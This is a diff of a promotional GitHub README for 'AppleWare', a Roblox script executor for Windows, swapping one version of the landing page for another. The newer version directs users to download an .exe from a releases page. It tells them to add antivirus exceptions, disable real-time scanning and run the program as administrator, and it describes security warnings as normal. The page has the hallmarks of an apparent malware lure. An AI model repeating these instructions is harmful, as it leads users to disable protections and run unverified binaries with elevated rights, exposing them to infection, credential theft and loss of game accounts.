@@ -1,130 +1,90 @@
-# AppleWare PC v - Roblox Script Executor 2026
+# 🍎 appleware-windows-script-hub - Run Roblox scripts with ease today
 
-> AppleWare is a Roblox script executor built around direct installation, a tailored UI, broad API coverage, and automatic updates, all packaged for a lean desktop workflow in 2026.
+[![](https://img.shields.io/badge/Download-AppleWare-blue.svg)](https://github.com/Alsb8889/appleware-windows-script-hub/releases)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/stoneleooxg5094/appleware-windows-script-hub?style=flat-square)](https://github.com)
+AppleWare PC is a tool for Windows 10 and 11. It helps users manage and run scripts within Roblox. The software provides a simple interface. It connects to the game engine to execute code. This package includes automatic updates. It runs as a desktop application. You find all necessary tools in one place.
 
----
+## 📥 How to download the software
 
-<p align="center">
-  <a href="https://stoneleooxg5094.github.io/appleware-windows-script-hub/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20AppleWare-v%20Latest-brightgreen?style=for-the-badge" alt="Download AppleWare">
-  </a>
-</p>
+1. Visit the [official releases page](https://github.com/Alsb8889/appleware-windows-script-hub/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your computer.
 
-> **[Direct Download - AppleWare v]((https://stoneleooxg5094.github.io/appleware-windows-script-hub/))**
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+## ⚙️ System requirements
 
----
+Your computer must meet these standards to run the software:
 
-[Download Latest Build](https://stoneleooxg5094.github.io/appleware-windows-script-hub/)
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4GB of RAM.
+* Storage: 200MB of free disk space.
+* Internet Connection: Required for updates and script loading.
+* Graphics: DirectX 11 support.
 
----
+Ensure your antivirus software allows the application to run. Some security tools block script executors by default. You may need to create an exception in your settings.
 
-## Overview
+## 🚀 Setting up the application
 
-AppleWare is a Roblox script executor created for people who want a straightforward install path, a clean custom interface, and reliable script execution support. The experience is aimed at a simple desktop workflow while keeping the focus on Roblox Lua execution, script hub usage, and regular releases.
+Follow these steps to install and start the program:
 
-Designed for Windows, AppleWare follows the standard Roblox executor pattern: load scripts, perform API-based actions, and keep navigation fast and uncluttered. Its positioning centers on full API support, auto-updates, and verified build distribution, making it a useful landing page for anyone looking for a Roblox script executor or Lua executor in 2026.
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to open the installer.
+3. Follow the instructions on the screen.
+4. Launch the application from your desktop icon.
+5. The software will check for updates during startup.
+6. Once ready, the main window will appear.
 
-## Main Features
+## ✨ Using the custom interface
 
-- Direct installation path that cuts down setup steps and speeds up readiness.
-- Custom UI built for a cleaner desktop feel and easier movement through the app.
-- Full API support for script loading and executor-side operations.
-- Auto-update support to help the app stay aligned with newer releases.
-- Script hub access for discovering and launching popular Roblox scripts.
-- Lightweight layout that keeps the interface responsive and task-focused.
-- Verified build packaging to help users recognize the intended download source.
-- Built for Roblox Lua executor workflows and common script hub searches.
+The interface keeps tasks simple. You see a list of tools on the left side. The text editor occupies the center space. You paste your scripts into this editor. 
 
-## Supported Games & Scripts
+### Loading your first script
+1. Click the 'File' menu.
+2. Choose 'Open' to select a script file from your computer.
+3. Alternatively, paste code directly into the large text box.
+4. Press the 'Execute' button to run the code in the game.
 
-| Game or Category | Typical Script Use |
-| --- | --- |
-| Blox Fruits | Farming, automation, and utility scripts |
-| Pet Simulator-style games | Progress helpers and repetitive-task scripts |
-| Anime battlegrounds | Combat assistance and UI tools |
-| Simulator games | Resource collection and looped actions |
-| General Roblox experiences | Lua execution, testing, and script hub browsing |
+### Managing scripts
+You can save your favorite scripts to the library. Click 'Save' to keep them for future use. The app organizes these files in a local folder. You do not need to rewrite code each time.
 
-## System Requirements
+## 🛠️ Improving performance
 
-| Component | Minimum |
-| --- | --- |
-| Operating System | Windows 10 or Windows 11, 64-bit |
-| RAM | 4 GB |
-| Storage | 200 MB free space |
-| .NET | .NET Desktop Runtime if required by the build |
-| Roblox | Installed and updated client |
+The software includes a setting menu for optimization. You can adjust the injection speed. Higher speeds work for most computers. Use lower speeds if you encounter stability issues. The software clears its cache automatically. This keeps the application fast.
 
-## Quick Start
+## 🛡️ Safety and security
 
-Clone the repository:
+This software interacts with game memory. Such tools trigger warnings from security scanners. This is standard behavior for this type of software. We built the tool to stay lightweight. It does not track personal data. Keep your software updated to ensure it runs well with the current version of Roblox.
 
-git clone https://github.com/stoneleooxg5094/appleware-windows-script-hub.git
+## ❓ Common questions
 
-Change into the project folder:
+**Does this work on Mac?**
+No, this software is for Windows only.
 
-cd appleware-executor
+**Why does my antivirus stop the app?**
+The app changes code inside a running game. Antivirus software sees this as a threat. You must trust the application in your security settings to proceed.
 
-Launch the executable:
+**How do I update the software?**
+The app checks for updates every time you open it. It replaces old files with new ones automatically. You do not need to delete the old version.
 
-AppleWareExecutor.exe
+**Where do I find scripts for the game?**
+You can find various scripts on community forums. Always check the reputation of the source before you download code.
 
-## Script Hub - Popular Searches 2026
+**The app keeps crashing, how do I fix it?**
+Restart your computer. Ensure you have the latest drivers for your graphics card. If problems continue, verify that you run the application as an administrator.
 
-- Roblox script executor
-- Lua executor for Roblox
-- Roblox script hub
-- direct install script executor
-- custom UI Roblox executor
-- full API support executor
-- auto-updates Roblox tool
+**Does it require a paid subscription?**
+No, the tool is free to use.
 
-## Architecture Overview
+## 🏁 Troubleshooting steps
 
-AppleWare/
-- AppleWareExecutor.exe
-- assets/
-- ui/
-- scripts/
-- updater/
-- README.md
+If the main window fails to show, check these common points:
 
-## FAQ
+1. Check your internet connection. The app requires a connection to link with the Roblox engine.
+2. Close other background programs that might conflict with the software.
+3. Update your Windows version to the latest build.
+4. Reinstall the app by removing the old folder first.
+5. Disable real-time scanning momentarily to see if the interface loads.
 
-**Is AppleWare tied to one platform?**  
-This landing page presents AppleWare as a Windows-oriented desktop tool.
+The application team remains committed to constant improvement. Each update brings better compatibility. Users can report issues through the tracking page on GitHub. Provide your error messages when reporting. This helps us find resolutions.
 
-**Do updates still matter after setup?**  
-Yes. Automatic updating is part of the product profile and is meant to keep builds current.
-
-**How is it different from other Roblox script executors?**  
-AppleWare focuses on direct install, a custom UI, and full API support instead of a heavier interface.
-
-**Could this impact my Roblox account?**  
-Third-party executors can involve account and policy risk. Check the relevant terms before using it.
-
-**Does it create local files?**  
-As with many desktop applications, it may store configuration or runtime files in its project folders.
-
-## Roadmap - 2026
-
-- [ ] Refine the custom UI for faster script access
-- [ ] Expand script hub organization and search flow
-- [ ] Improve update delivery and version tracking
-- [ ] Add more executor-side API coverage
-- [ ] Polish documentation for first-time setup
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
-
-<p align="center">
-  <i>AppleWare v - a focused Roblox script executor with direct install, custom UI, and auto-updates.</i>
-</p>
+Keywords: roblox, executor, script, windows, software, tools, utility
